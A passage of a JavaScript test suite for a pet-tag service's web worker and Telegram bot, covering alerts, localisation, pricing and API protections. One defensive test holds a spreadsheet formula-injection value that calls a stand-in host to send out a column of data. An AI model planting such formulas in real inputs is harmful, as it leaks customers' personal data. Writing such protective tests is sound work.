  r = await (await call(tenv, '/api/found', { method: 'POST', body: { id_tag: d.id_tag } })).json();
  assert.equal(r.repeat, true);
  assert.equal(state.tg.slice(before).length, 0);
  // с геолокацией — ссылки на карту и точка
  before = state.tg.length;
  r = await (await call(tenv, '/api/found', { method: 'POST', body: { id_tag: d.id_tag, lat: 32.79, lon: 34.99, accuracy: 12 } })).json();
  assert.equal(r.success, true);
  const withLoc = state.tg.slice(before);
  assert.match(withLoc[0].payload.text, /maps\.google\.com\/\?q=32\.79,34\.99/);
  assert.equal(withLoc[1].method, 'sendLocation');
  // Базовый тариф — бот не пишет
  const b = await reg('basic');
  state.tags.find((t) => t.tag_id === String(b.id_tag)).telegram_chat_id = '9191';
  before = state.tg.length;
  r = await (await call(tenv, '/api/found', { method: 'POST', body: { id_tag: b.id_tag } })).json();
  assert.equal(r.success, true);  // Базис тоже получает сообщение в Telegram
  assert.equal(state.tg.slice(before).filter((c) => c.payload.chat_id === '9191').length, 1);
});

await test('landing demo shows the real bot messages and the real tag page (kept in sync)', async () => {
  const home = await (await call(env, '/')).text();
  // сообщение о скане — дословно как шлёт бот
  const C = 'demo1';
  const d = await (await call(env, '/api/register', { method: 'POST', body: {
    owner_name: 'Demo', phone: '050-123-4567', pet_name: 'Bella', address: 'Haifa', consent: true, tags: 1 } })).json();
  state.tags.find((t) => t.tag_id === String(d.id_tag)).telegram_chat_id = C;
  await new Promise((r) => setTimeout(r, 1100));
  await call(env, '/api/scan', { method: 'POST', body: { id_tag: d.id_tag } });
  const alert = [...state.tg].reverse().find((c) => c.payload.chat_id === C).payload;
  const body = alert.text.replace(/<[^>]+>/g, '').split('\n').slice(1).join(' ');
  for (const line of body.split('. ')) assert.ok(home.includes(line.trim()), 'demo is missing: ' + line);
  assert.ok(home.includes(alert.reply_markup.inline_keyboard[0][0].text));
  assert.match(home, /Bella's tag was just scanned!/);
  // сообщение с геолокацией
  await call(env, '/api/location', { method: 'POST', body: { id_tag: d.id_tag, lat: 32.79, lon: 34.99, accuracy: 12 } });
  const loc = [...state.tg].reverse().find((c) => c.payload.chat_id === C && c.method === 'sendMessage').payload.text;
  assert.match(loc, /Bella has been found!/); assert.match(home, /🚨📍 <b>Bella has been found!<\/b>/);
  assert.match(loc, /accuracy ±12 m/); assert.match(home, /accuracy ±12 m/);
  assert.match(loc, /Open in Google Maps/); assert.match(home, /Open in Google Maps/);
  // страница жетона: те же кнопки и подписи, что в демо
  const tag = await (await call(env, '/t/101')).text();
  for (const s of ['Hi! My name is', 'Found me? 👋', 'Call my owner', 'Allow sharing my location', 'Telegram', 'WhatsApp']) {
    assert.ok(tag.includes(s), 'tag page: ' + s); assert.ok(home.includes(s), 'demo: ' + s);
  }
});

// ---- Тестовый сайт (окружение staging: test.findy-pet.com) ----
const testEnv = () => ({ STAGE: 'test', TEST_DB: '1', SITE_URL: 'https://test.findy-pet.com', BOT_USERNAME: 'FindYpetTestBot',
  BOT_TOKEN: 'T', WEBHOOK_SECRET: 'sec', ADMIN_CHAT_ID: 'admin', TIMEZONE: 'Asia/Jerusalem', FYP_KV: makeKV() });

await test('test site: TEST banner, [TEST] title, noindex, robots.txt; production pages unmarked', async () => {
  const tenv = testEnv();
  for (const p of ['/', '/t/9001', '/privacy/']) {
    const r = await call(tenv, p);
    assert.equal(r.status, 200, p);
    assert.equal(r.headers.get('X-Robots-Tag'), 'noindex, nofollow');
    const html = await r.text();
    assert.match(html, /<body[^>]*><div id="fyp-test-banner"/, p);
    assert.match(html, /<title>\[TEST\] /, p);
  }
  const js = await call(tenv, '/js/app.js');
  assert.equal(js.headers.get('X-Robots-Tag'), 'noindex, nofollow');
  assert.doesNotMatch(await js.text(), /fyp-test-banner/);
  const robots = await call(tenv, '/robots.txt');
  assert.equal(await robots.text(), 'User-agent: *\nDisallow: /\n');
  // Рабочий сайт: ничего этого нет
  const prod = await call(makeEnv({ SITE_URL: 'https://findy-pet.com' }), '/');
  assert.equal(prod.headers.get('X-Robots-Tag'), null);
  const prodHtml = await prod.text();
  assert.doesNotMatch(prodHtml, /fyp-test-banner|\[TEST\]/);
});

await test('test site: orders go to the test DB (KV), never to the Google Sheet', async () => {
  const tenv = testEnv();
  const sheetRows = state.tags.length;
  const d = await (await call(tenv, '/api/register', { method: 'POST', body: {
    owner_name: 'Test Owner', phone: '050-999-0000', pet_name: 'Testy', address: 'Haifa', consent: true,
    tags: 4, pets: ['Bonny'], spare_for: [0, 1] } })).json();
  assert.equal(d.success, true);
  assert.deepEqual(d.tags.map((t) => [t.id_tag, t.copies]), [['9001', 2], ['9002', 2]]);
  assert.equal(d.order_id, 'FY9001');
  assert.equal(d.tag_url, 'https://test.findy-pet.com/t/9001');
  assert.match(d.telegram_link, /^https:\/\/t\.me\/FindYpetTestBot\?start=[a-f0-9]{24}$/);
  assert.equal(state.tags.length, sheetRows, 'Google Sheet must not be touched');
  // Страница жетона берёт данные из тестовой базы
  const page = await (await call(tenv, '/api/tag?id=9002')).json();
  assert.equal(page.found, true);
  assert.equal(page.pet_name, 'Bonny');
  assert.equal(page.phone, '+972509990000');
  // Привязка Telegram одним Start: оба жетона заказа
  const CH = 7700;
  await tgUpdate(tenv, msg(CH, '/start ' + d.telegram_link.split('start=')[1]));
  const kv = tenv.FYP_KV;
  assert.deepEqual(await kv.get(`db:chat:${CH}`, 'json'), ['9001', '9002']);
  // Скан → уведомление владельцу; повторный скан в течение минуты не дублирует уведомление
  const before = state.tg.length;
  await call(tenv, '/api/scan', { method: 'POST', body: { id_tag: '9001' } });
  await call(tenv, '/api/scan', { method: 'POST', body: { id_tag: '9001' } });
  const alerts = state.tg.slice(before).filter((c) => String(c.payload.chat_id) === String(CH));
  assert.equal(alerts.length, 1);
  // Диалог с ботом тоже хранится в тестовой базе
  await tgUpdate(tenv, msg(CH, '/register'));
  assert.ok(await kv.get(`db:st:${CH}`));
  await tgUpdate(tenv, msg(CH, '/cancel'));
  assert.equal(await kv.get(`db:st:${CH}`), null);
});

await test('test site: no scheduled reminders', async () => {
  const tenv = testEnv();
  await tenv.FYP_KV.put('chat:1', JSON.stringify({ since: '2020-01-01T00:00:00Z', last_reminder: '2020-01-01T00:00:00Z' }));
  const before = state.tg.length;
  const pending = [];
  await worker.scheduled({}, tenv, { waitUntil: (p) => pending.push(p) });
  await Promise.all(pending);
  assert.equal(state.tg.length, before);
});

await test('switch to 3 + 1: bot dialog started under 2 + 1 re-confirms the new price; double tap; old page warns admin', async () => {
  // диалог дошёл до «Confirm» ещё при 2 + 1 (slots: 3, «3 tags — 98 ₪»)
  const C = '7303';
  state.states[C] = { step: 'confirm', owner_name: 'Old', phone: '+972541110000', pet_name: 'Bella',
    address: 'Haifa', slots: 3, pets: ['Bella', 'Rex'], spare_for: [1] };
  const n = state.tags.length;
  await tgUpdate(env, cb(C, 'reg_ok'));
  assert.equal(state.tags.length, n, 'no order yet — the customer has not seen 147 ₪');
  const msgs = state.tg.filter((c) => c.payload.chat_id === C && c.method === 'sendMessage').slice(-2).map((c) => c.payload);
  assert.match(msgs[0].text, /offer has changed: now <b>3 \+ 1 — 4 tags for 147 ₪/);
  assert.match(msgs[1].text, /Spare tag 2 of 2 — for which pet/);
  assert.deepEqual(msgs[1].reply_markup.inline_keyboard.map((r) => r[0].callback_data), ['fam_sp_1_0', 'fam_sp_1_1']);
  await tgUpdate(env, cb(C, 'fam_sp_1_0'));
  const before = state.tg.length;
  await tgUpdate(env, cb(C, 'fam_sp_1_1'));            // второе нажатие по тому же вопросу — молча игнорируем
  assert.equal(state.tg.filter((c, i) => i >= before && c.method === 'sendMessage').length, 0);
  const conf = lastTg('sendMessage').payload.text;
  assert.match(conf, /Bella — 2 tags \(1 spare\)/); assert.match(conf, /Rex — 2 tags \(1 spare\)/);
  assert.match(conf, /4 tags \(3 \+ 1 free\) — 147 ₪/);
  await tgUpdate(env, cb(C, 'reg_ok'));
  assert.equal(state.tags.length, n + 2);
  // заказ со страницы 2 + 1, открытой до обновления (tags: 3) → 3 + 1, админ видит предупреждение
  const d = await (await call(env, '/api/register', { method: 'POST', body: {
    owner_name: 'Tab', phone: '050-404-4040', pet_name: 'Lulu', address: 'Acre', consent: true, tags: 3 } })).json();
  assert.equal(d.price, 147);
  assert.match(lastTg('sendMessage').payload.text, /page opened before 3 \+ 1 \(it showed 3 tags for 98 ₪\)/);
  await call(env, '/api/register', { method: 'POST', body: {
    owner_name: 'New', phone: '050-404-4041', pet_name: 'Lala', address: 'Acre', consent: true, tags: 4 } });
  assert.doesNotMatch(lastTg('sendMessage').payload.text, /page opened before/);
});

await test('landing: 3 + 1 everywhere (1 / 2 / 4 tags in the form), no 2 + 1 left on the site', async () => {
  const home = await (await call(env, '/')).text();
  const i18n = await (await call(env, '/js/i18n.js')).text();
  const app = await (await call(env, '/js/app.js')).text();
  for (const [name, body] of [['index.html', home], ['i18n.js', i18n], ['app.js', app]]) {
    assert.doesNotMatch(body, /2 \+ 1|3rd tag|третий в подарок|השלישי במתנה|data-price="three"|trioPer/, name);
  }
  assert.deepEqual([...home.matchAll(/name="qty" value="(\d)"/g)].map((m) => m[1]), ['1', '2', '4']);
  assert.match(home, /class="btn btn-primary btn-block choose" data-qty="4"/);
  assert.equal([...home.matchAll(/class="ftag" data-i="\d"/g)].length, 4);
  assert.match(home, /data-i="3">\s*<div class="ft-head">.*class="ft-spare-chk" checked/); // 4-й (подарок) — запасной по умолчанию
  assert.doesNotMatch(home, /data-i="2">\s*<div class="ft-head">.*class="ft-spare-chk" checked/);
  for (const l of ['bundleBadge: "4th tag free"', 'bundleBadge: "התג הרביעי במתנה"', 'bundleBadge: "Четвёртый в подарок"']) assert.ok(i18n.includes(l), l);
});

// ---------- Стадия 1 аудита: защита API ----------
function fakeLimiter(max) {
  const seen = new Map();
  return { async limit({ key }) { const n = (seen.get(key) || 0) + 1; seen.set(key, n); return { success: n <= max }; } };
}

await test('API: only JSON from our own pages; other sites and form posts are refused', async () => {
  const r1 = await call(env, '/api/found', { method: 'POST', body: { id_tag: 1 }, headers: { Origin: 'https://evil.example' } });
  assert.equal(r1.status, 403);
  const r2 = await worker.fetch(new Request('http://localhost:8787/api/register', { method: 'POST',
    headers: { 'Content-Type': 'text/plain' }, body: '{"owner_name":"x"}' }), env, { waitUntil() {} });
  assert.equal(r2.status, 415);
  const ok = await call(env, '/api/register', { method: 'POST', body: { owner_name: 'Same', phone: '050-777-1111', pet_name: 'Pip', address: 'Haifa', consent: true },
    headers: { Origin: 'http://localhost:8787' } });
  assert.equal((await ok.json()).success, true);
  const pre = await call(env, '/api/tag?id=1', { method: 'OPTIONS' });
  assert.notEqual(pre.headers.get('Access-Control-Allow-Origin'), 'https://evil.example');
});

await test('API: rate limits per visitor and per tag; tag page shows "try again", not "not found"', async () => {
  const e = makeEnv({ RL_READ: fakeLimiter(2), RL_SIGNAL: fakeLimiter(100), RL_ORDER: fakeLimiter(1), RL_TAG: fakeLimiter(3) });
  const ip = { 'CF-Connecting-IP': '203.0.113.9' };
  for (let i = 0; i < 2; i++) assert.notEqual((await call(e, '/api/tag?id=101', { headers: ip })).status, 429);
  const t = await call(e, '/api/tag?id=101', { headers: ip });
  assert.equal(t.status, 429); assert.equal((await t.json()).error, 'temp_error');
  const body = { owner_name: 'Flood', phone: '050-777-2222', pet_name: 'Rex', address: 'Haifa', consent: true };
  assert.equal((await call(e, '/api/register', { method: 'POST', body, headers: ip })).status, 200);
  assert.equal((await call(e, '/api/register', { method: 'POST', body, headers: ip })).status, 429);
  // 3 оповещения в минуту на жетон, даже с разных адресов
  const d = await (await call(env, '/api/register', { method: 'POST', body: { owner_name: 'Owner', phone: '050-777-3333', pet_name: 'Tom', address: 'Haifa', consent: true } })).json();
  state.tags.find((x) => x.tag_id === String(d.id_tag)).telegram_chat_id = 'rl1';
  const codes = [];
  for (let i = 0; i < 5; i++) {
    codes.push((await call(e, '/api/location', { method: 'POST', body: { id_tag: d.id_tag, lat: 32 + i / 100, lon: 34.9 },
      headers: { 'CF-Connecting-IP': `198.51.100.${i}` } })).status);
  }
  assert.deepEqual(codes, [200, 200, 200, 429, 429]);
});

await test('"found" messages warn the owner about money scams', async () => {
  const d = await (await call(env, '/api/register', { method: 'POST', body: { owner_name: 'Safe', phone: '050-777-4444', pet_name: 'Lucky', address: 'Haifa', consent: true } })).json();
  state.tags.find((x) => x.tag_id === String(d.id_tag)).telegram_chat_id = 'safe1';
  await call(env, '/api/location', { method: 'POST', body: { id_tag: d.id_tag, lat: 32.1, lon: 34.8 } });
  const m = state.tg.filter((c) => c.payload.chat_id === 'safe1' && c.method === 'sendMessage').pop().payload.text;
  assert.match(m, /never asks anyone for money/);
});

await test('names and addresses cannot become spreadsheet formulas', async () => {
  const d = await (await call(env, '/api/register', { method: 'POST', body: {
    owner_name: '=IMAGE("https://x.example/?"&C:C)', phone: '050-777-5555', pet_name: '+Rex', address: '@Haifa', consent: true } })).json();
  const row = state.tags.find((x) => x.tag_id === String(d.id_tag));
  assert.equal(row.owner_name, 'IMAGE("https://x.example/?"&C:C)');
  assert.equal(row.pet_name, 'Rex'); assert.equal(row.address, 'Haifa');
});

await test('bot: two quick taps on Confirm create one order', async () => {
  const C = '7404';
  state.states[C] = { step: 'confirm', owner_name: 'Twice', phone: '+972541112222', pet_name: 'Dot', address: 'Haifa', slots: 1, pets: ['Dot'] };
  const n = state.tags.length;
  // второе нажатие приходит, пока первое ещё создаёт заказ (таблица отвечает медленно)
  const first = tgUpdate(env, cb(C, 'reg_ok'));
  await new Promise((r) => setTimeout(r, 5));
  await Promise.all([first, tgUpdate(env, cb(C, 'reg_ok'))]);
  assert.equal(state.tags.length, n + 1);
});

await test('order funnel: site events are counted; /stats only for admin', async () => {
  for (const e of ['plan', 'plan', 'form', 'submit', 'tg']) await call(env, '/api/ev', { method: 'POST', body: { e, lang: 'ru' } });
  assert.equal((await call(env, '/api/ev', { method: 'POST', body: { e: 'hack' } })).status, 400);
  await tgUpdate(env, msg('admin', '/stats'));
  const t = lastTg('sendMessage').payload.text;
  assert.match(t, /Chose a plan: 2/); assert.match(t, /Sent an order: 1/); assert.match(t, /ru 2/);
  const before = state.tg.length;
  await tgUpdate(env, msg('stranger', '/stats'));
  assert.ok(!state.tg.slice(before).some((c) => /Order funnel/.test(c.payload.text || '')));
});

await test('texts: printed (not engraved) everywhere; finder button says "Notify the owner"', async () => {
  const home = await (await call(env, '/')).text();
  const i18n = await (await call(env, '/js/i18n.js')).text();
  const tag = await (await call(env, '/t/101')).text();
  for (const [name, txt] of [['landing', home], ['i18n', i18n], ['tag page', tag]]) {
    assert.doesNotMatch(txt, /engrav|гравир|выгравир|חרוט|חורט|חריטה/i, name);
  }
  assert.match(tag, /data-t="notify">Notify the owner/); assert.match(tag, /FindYpet never asks finders for money/);
  assert.match(tag, /id="notesText" dir="auto"/);
  assert.doesNotMatch(i18n, /„אבד”/); assert.doesNotMatch(i18n, /Я потерялся/);
});

// Проверки после выкладки (deploy-worker.yml) ищут строки в ответах Worker'а.
// Если строка в сайте поменялась, а в проверке — нет, выкладка в main «падает» уже после деплоя.
await test('deploy smoke checks look for strings the worker really serves', async () => {
  const { readFileSync } = await import('node:fs');
  const yml = readFileSync(new URL('../../.github/workflows/deploy-worker.yml', import.meta.url), 'utf8');
  const step = (name) => yml.split(/\n\s*- name: /).find((s) => s.startsWith(name)) || '';
  const checks = (body) => [
    // только строки-утверждения (не «if … grep» — это проверки, что чего-то НЕТ)
    ...[...body.matchAll(/^\s*echo "\$page" \| grep -q '([^']+)'/gm)].map((m) => ['/', m[1]]),
    ...[...body.matchAll(/^\s*curl -fsS "\$base(\/[^"]*)" \| grep -q '([^']+)'/gm)].map((m) => [m[1], m[2]]),
  ];
  for (const [name, e] of [['Smoke test (workers.dev)', makeEnv({ SITE_URL: 'https://findy-pet.com' })], ['Smoke test (test site)', testEnv()]]) {
    const list = checks(step(name));
    assert.ok(list.length >= 2, `${name}: checks not found in workflow`);
    for (const [path, needle] of list) {
      const body = await (await call(e, path)).text();
      assert.ok(body.includes(needle), `${name}: ${path} does not contain '${needle}'`);
    }
  }
});

// ---- Стадия 2: бот на иврите и русском, фото, объявление, страница из KV ----
const he = { first_name: 'Dana', language_code: 'he' };
await test('Hebrew Telegram → Hebrew welcome, menu and registration; buttons are recognised', async () => {
  const C = '7101';
  await tgUpdate(env, msg(C, '/start', { from: he }));
  const w = lastTg('sendMessage').payload;
  assert.match(w.text, /ברוכים הבאים ל-FindYpet/);
  assert.match(w.text, /עברית · Русский · English — ‎\/lang/);
  assert.equal(w.reply_markup.keyboard[0][0].text, '🐾 רישום חיית מחמד');
  await tgUpdate(env, msg(C, '🐾 רישום חיית מחמד', { from: he }));
  assert.equal(state.states[C].step, 'name');
  assert.match(lastTg('sendMessage').payload.text, /רישום חיית מחמד חדשה/);
  for (const t of ['Dana', '050-222-3344', 'Shoko', 'Tel Aviv']) await tgUpdate(env, msg(C, t, { from: he }));
  const q = state.tg.filter((c) => c.payload.chat_id === C && c.payload.reply_markup && c.payload.reply_markup.inline_keyboard).at(-1).payload;
  assert.match(q.text, /כמה תגים\?/);
  assert.equal(q.reply_markup.inline_keyboard[2][0].text, '4 תגים (⁦3 + 1⁩ במתנה) — 147 ₪');
  await tgUpdate(env, cb(C, 'qty_1', he));
  const conf = lastTg('sendMessage').payload;
  assert.match(conf.text, /בדקו בבקשה את הפרטים/); assert.match(conf.text, /privacy\/\?lang=he/);
  assert.equal(conf.reply_markup.inline_keyboard[0][0].text, '✅ אישור');
  const n = state.tags.length;
  await tgUpdate(env, cb(C, 'reg_ok', he));
  assert.equal(state.tags.length, n + 1);
  const id = state.tags.at(-1).tag_id;
  assert.equal((await KV.get(`x:${id}`, 'json')).lang, 'he');
  assert.equal(await KV.get(`lang:${C}`), 'he');
  const reg = state.tg.filter((c) => c.payload.chat_id === C && c.method === 'sendMessage').at(-2).payload.text;
  assert.match(reg, /Dana, נרשמתם ל-FindYpet/); assert.match(reg, /הזמנה <b>FY\d+<\/b> · תג אחד · 49 ₪/);
  // админу — по-английски
  assert.match(state.tg.filter((c) => c.payload.chat_id === 'admin').at(-1).payload.text, /New order FY\d+/);
});

await test('owner alerts follow the order language (HE): scan, found + scam warning, location, SMS', async () => {
  const d = await (await call(env, '/api/register', { method: 'POST', body: {
    owner_name: 'Noa', phone: '050-333-4455', pet_name: 'Luna', address: 'Haifa', consent: true, lang: 'he' } })).json();
  const row = state.tags.find((t) => t.tag_id === String(d.id_tag));
  row.telegram_chat_id = '7102';
  await new Promise((r) => setTimeout(r, 1100));
  await call(env, '/api/scan', { method: 'POST', body: { id_tag: d.id_tag } });
  const scan = lastTg('sendMessage').payload;
  assert.match(scan.text, /התג של Luna נסרק עכשיו!/);
  assert.equal(scan.reply_markup.inline_keyboard[0][0].text, '🚨 חיית המחמד נעלמה — הפעלת מצב חיפוש');
  await call(env, '/api/found', { method: 'POST', body: { id_tag: d.id_tag } });
  const f = lastTg('sendMessage').payload.text;
  assert.match(f, /מצאו את Luna!/); assert.match(f, /FindYpet אף פעם לא מבקשת כסף/);
  await call(env, '/api/location', { method: 'POST', body: { id_tag: d.id_tag, lat: 32.8, lon: 35.0, accuracy: 9 } });
  const loc = state.tg.filter((c) => c.payload.chat_id === '7102' && c.method === 'sendMessage').at(-1).payload.text;
  assert.match(loc, /דיוק ±9 מ׳/); assert.match(loc, /\u2066🗺 <a href="https:\/\/maps\.google\.com\/\?q=32\.8,35">Google Maps<\/a>  ·  🚗 <a [^>]+>Waze<\/a>\u2069/);
  // без Telegram — SMS на иврите
  row.telegram_chat_id = '';
  const smsEnv = makeEnv({ TWILIO_ACCOUNT_SID: 'AC1', TWILIO_AUTH_TOKEN: 'x', TWILIO_FROM: 'FindYpet' });
  await call(smsEnv, '/api/location', { method: 'POST', body: { id_tag: d.id_tag, lat: 32.8, lon: 35.0 } });
  assert.match(state.sms.at(-1).Body, /^FindYpet: מצאו את Luna!/);
});

await test('order status messages reach the customer in the order language (RU); admin stays English', async () => {
  const d = await (await call(env, '/api/register', { method: 'POST', body: {
    owner_name: 'Ira', phone: '050-444-5566', pet_name: 'Barsik', address: 'Ashdod', consent: true, lang: 'ru', tags: 2 } })).json();
  await tgUpdate(env, msg('7103', '/start ' + d.telegram_link.split('start=')[1]));
  await tgUpdate(env, cb('admin', `ord:${d.order_id}:paid`));
  const toCustomer = state.tg.filter((c) => c.payload.chat_id === '7103').at(-1).payload.text;
  assert.match(toCustomer, /Оплата получена — спасибо!/); assert.match(toCustomer, /изготавливаем жетоны для: Barsik/);
  assert.match(lastTg('sendMessage').payload.text, /Customer notified/);
  await tgUpdate(env, cb('admin', `ord:${d.order_id}:shipped`));
  assert.match(state.tg.filter((c) => c.payload.chat_id === '7103').at(-1).payload.text, /Ваши жетоны FindYpet уже в пути!/);
});

await test('/setup: commands and descriptions in English (default), Hebrew and Russian', async () => {
  const before = state.tg.length;
  const d = await (await call(env, '/setup?key=sec')).json();
  assert.equal(d.setMyCommands.ok, true); assert.equal(d.setMyCommands_he.ok, true); assert.equal(d.setMyCommands_ru.ok, true);
  const cmds = state.tg.slice(before).filter((c) => c.method === 'setMyCommands');
  assert.deepEqual(cmds.map((c) => c.payload.language_code), [undefined, 'he', 'ru']);
  assert.ok(cmds.every((c) => c.payload.commands.some((x) => x.command === 'lang') && c.payload.commands.some((x) => x.command === 'photo')));
  assert.equal(cmds[2].payload.commands[0].description, 'Зарегистрировать питомца и получить жетон');
  const desc = state.tg.slice(before).filter((c) => c.method === 'setMyShortDescription');
  assert.ok(desc.every((c) => c.payload.short_description.length <= 120));
});

await test('/photo: owner sends a photo → stored, shown on the tag page, served as JPEG; can be removed', async () => {
  const C = '7104';
  const d = await (await call(env, '/api/register', { method: 'POST', body: {
    owner_name: 'Gil', phone: '050-555-6677', pet_name: 'Pita', address: 'Haifa', consent: true, lang: 'en' } })).json();
  await tgUpdate(env, msg(C, '/start ' + d.telegram_link.split('start=')[1]));
  await tgUpdate(env, msg(C, '/photo'));
  assert.equal(state.states[C].step, 'photo');
  assert.match(lastTg('sendMessage').payload.text, /Send one photo of <b>Pita<\/b>/);
  await tgUpdate(env, msg(C, 'hello'));
  assert.match(lastTg('sendMessage').payload.text, /send the photo as a picture/);
  await tgUpdate(env, msg(C, '', { photo: [
    { file_id: 'small', width: 90, height: 90, file_size: 2000 },
    { file_id: 'big', width: 1280, height: 960, file_size: 120000 },
    { file_id: 'huge', width: 2560, height: 1920, file_size: 900000 } ] }));
  assert.equal(state.tg.filter((c) => c.method === 'getFile').at(-1).payload.file_id, 'big');
  const x = await KV.get(`x:${d.id_tag}`, 'json');
  assert.ok(x.photo_v);
  assert.match(state.tg.filter((c) => c.payload.chat_id === C && c.method === 'sendMessage').at(-2).payload.text, /Photo saved/);
  const page = await (await call(env, `/api/tag?id=${d.id_tag}`)).json();
  assert.equal(page.photo, `/img/${d.id_tag}?v=${x.photo_v}`);
  const img = await call(env, page.photo);
  assert.equal(img.status, 200); assert.equal(img.headers.get('Content-Type'), 'image/jpeg');
  assert.match(img.headers.get('Cache-Control'), /immutable/);
  assert.equal(new Uint8Array(await img.arrayBuffer())[0], 0xff);
  const tagHtml = await (await call(env, `/t/${d.id_tag}`)).text();
  assert.match(tagHtml, /id="petPhoto"/);
  await tgUpdate(env, cb(C, `clr:${d.id_tag}:photo`));
  assert.match(lastTg('sendMessage').payload.text, /Photo removed/);
  assert.equal((await call(env, `/img/${d.id_tag}`)).status, 404);
  assert.equal((await (await call(env, `/api/tag?id=${d.id_tag}`)).json()).photo, '');
});

await test('poster /p/<id>: three languages, call button, QR, noindex; opening it does not alert the owner; home → no phone', async () => {
  const C = '7105';
  const d = await (await call(env, '/api/register', { method: 'POST', body: {
    owner_name: 'Rina', phone: '050-666-7788', pet_name: 'Mitzi', address: 'Haifa', consent: true, lang: 'he' } })).json();
  await tgUpdate(env, msg(C, '/start ' + d.telegram_link.split('start=')[1]));
  await tgUpdate(env, msg(C, '/photo'));
  await tgUpdate(env, msg(C, '', { photo: [{ file_id: 'p1', width: 800, height: 800 }] }));
  await tgUpdate(env, msg(C, '/lost'));
  await tgUpdate(env, msg(C, 'Hadar <b>'));
  const own = lastTg('sendMessage').payload.text;
  assert.match(own, /מצב חיפוש הופעל: Mitzi/);
  assert.match(own, /^🇮🇱 <code>/m); assert.doesNotMatch(own, /עדיין אין תמונה/);
  const before = state.tg.length;
  const r = await call(env, `/p/${d.id_tag}`);
  assert.equal(r.status, 200); assert.equal(r.headers.get('X-Robots-Tag'), 'noindex, nofollow');
  const html = await r.text();
  assert.equal(state.tg.length, before, 'opening the poster must not message the owner');
  assert.match(html, /חיית מחמד אבודה/); assert.match(html, /Потерялся питомец/); assert.match(html, /Lost pet/);
  assert.match(html, /href="tel:\+972506667788"/); assert.match(html, /050-666-7788/);
  assert.match(html, /Hadar &lt;b&gt;/); assert.doesNotMatch(html, /Hadar <b>/);
  assert.match(html, /<svg[^>]+aria-label="QR"/);
  assert.match(html, new RegExp(`og:image" content="http://localhost:8787/img/${d.id_tag}\\?v=`));
  assert.match(html, /wa\.me\/972506667788/);
  await tgUpdate(env, msg(C, '/found'));
  const home = await (await call(env, `/p/${d.id_tag}`)).text();
  assert.match(home, /כבר בבית!/); assert.doesNotMatch(home, /tel:/); assert.doesNotMatch(home, /050-666-7788/);
  assert.equal((await call(env, '/p/99999')).status, 404);
});

await test('QR code on the poster: correct size and finder patterns', async () => {
  const m = _test.qrMatrix('https://findy-pet.com/p/101');
  assert.equal(m.length, 29); // версия 3
  const finder = (x, y) => [0, 1, 2, 3, 4, 5, 6].every((i) => m[y][x + i] && m[y + 6][x + i] && m[y + i][x] && m[y + i][x + 6]);
  assert.ok(finder(0, 0) && finder(22, 0) && finder(0, 22));
});

await test('tag page answers from the saved copy at once; a disabled tag disappears after the background refresh', async () => {
  const d = await (await call(env, '/api/register', { method: 'POST', body: {
    owner_name: 'Ben', phone: '050-777-8899', pet_name: 'Rocky', address: 'Haifa', consent: true } })).json();
  const row = state.tags.find((t) => t.tag_id === String(d.id_tag));
  row.phone = '050-777-0000';
  const first = await (await call(env, `/api/tag?id=${d.id_tag}`)).json();
  assert.equal(first.phone, '+972507778899'); // копия — сразу
  assert.equal((await (await call(env, `/api/tag?id=${d.id_tag}`)).json()).phone, '+972507770000'); // обновилась в фоне
  row.status = 'disabled';
  await call(env, `/api/tag?id=${d.id_tag}`);
  assert.equal((await (await call(env, `/api/tag?id=${d.id_tag}`)).json()).found, false);
});

await test('bot dictionary: every language has every text', async () => {
  const keys = (l) => Object.keys(_test.BOT[l]).sort();
  assert.deepEqual(keys('he'), keys('en')); assert.deepEqual(keys('ru'), keys('en'));
  for (const l of ['en', 'he', 'ru']) assert.ok(_test.tr(l, 'shortDesc').length <= 120 && _test.tr(l, 'desc').length <= 512);
});

// ---- Стадия 2: лендинг ----
const loadI18n = async () => {
  const { readFileSync } = await import('node:fs');
  const src = readFileSync(new URL('../../js/i18n.js', import.meta.url), 'utf8');
  const stub = 'const localStorage={getItem(){return null},setItem(){}};const navigator={language:"en"};' +
    'const document={documentElement:{},querySelectorAll(){return []}};';
  return new Function(stub + src + '; return I18N;')();
};
await test('landing: real tag (glow), why-a-chip table, 2 price cards + specs grid + Care announcement, new FAQ; finder block after FAQ', async () => {
  const home = await (await call(env, '/')).text();
  assert.match(home, /<symbol id="tag-art"/); assert.match(home, /id="glowBtn"/);
  assert.doesNotMatch(home, /flipTag|flip-tag|scr-dog|🐕/);
  assert.match(home, /<table class="compare/);
  assert.doesNotMatch(home, /data-plan="care"/); assert.match(home, /class="care-ann/); assert.doesNotMatch(home, /care-strip/);
  for (const k of ['sp1', 'sp2', 'sp3', 'sp4', 'sp5', 'sp6', 'sp6s', 'careTitle', 'care1', 'care3s', 'careNote', 'qBat', 'qWater', 'qFit', 'qSpam']) assert.match(home, new RegExp(`data-t="${k}"`));
  assert.ok(home.indexOf('id="faq"') < home.indexOf('id="finder"'), 'finder block goes after FAQ');
  assert.ok(home.indexOf('id="why"') < home.indexOf('id="plans"'));
  assert.match(home, /class="btn btn-primary btn-sm choose" data-qty="1"/); // нижняя панель сразу открывает форму
  assert.doesNotMatch(home, /Telegram · now/);
});

await test('landing translations: every data-t key exists, all languages have the same keys', async () => {
  const I18N = await loadI18n();
  const home = await (await call(env, '/')).text();
  const keys = new Set([...home.matchAll(/data-t(?:-html|-aria|-ph)?="([A-Za-z0-9]+)"/g)].map((m) => m[1]));
  for (const k of keys) assert.ok(k in I18N.en, 'missing in I18N.en: ' + k);
  const ks = (l) => Object.keys(I18N[l]).sort().join();
  assert.equal(ks('he'), ks('en')); assert.equal(ks('ru'), ks('en'));
  for (const l of ['en', 'he', 'ru']) for (const k of ['errReq', 'formTotal', 'bundlePer', 'bundlePerEq', 'glowBtn', 'glowBtnDay']) assert.ok(I18N[l][k], `${l}.${k}`);
});

await test('demo chat on the landing = the real bot messages in each language', async () => {
  const I18N = await loadI18n();
  const home = await (await call(env, '/')).text();
  const NAME = { en: 'Bella', he: 'בלה', ru: 'Белла' }, LOC = { en: 'en-GB', he: 'he-IL', ru: 'ru-RU' };
  for (const L of ['en', 'he', 'ru']) {
    const time = (min) => new Date(Date.UTC(2026, 9, 6, 11, min)).toLocaleString(LOC[L], { timeZone: 'Asia/Jerusalem', day: '2-digit', month: 'short', hour: '2-digit', minute: '2-digit' });
    const b1 = _test.tr(L, 'scanned', { pet: NAME[L], time: time(32) }).replace(/\n/g, '<br>') + `<span class="tg-kb">${_test.tr(L, 'btnLostOn')}</span>`;
    // время в скобках зависит от версии ICU в Node — сравниваем без него
    const noTime = (x) => x.replace(/\(([^()]*\d{1,2}:\d{2})\)/g, '(T)');
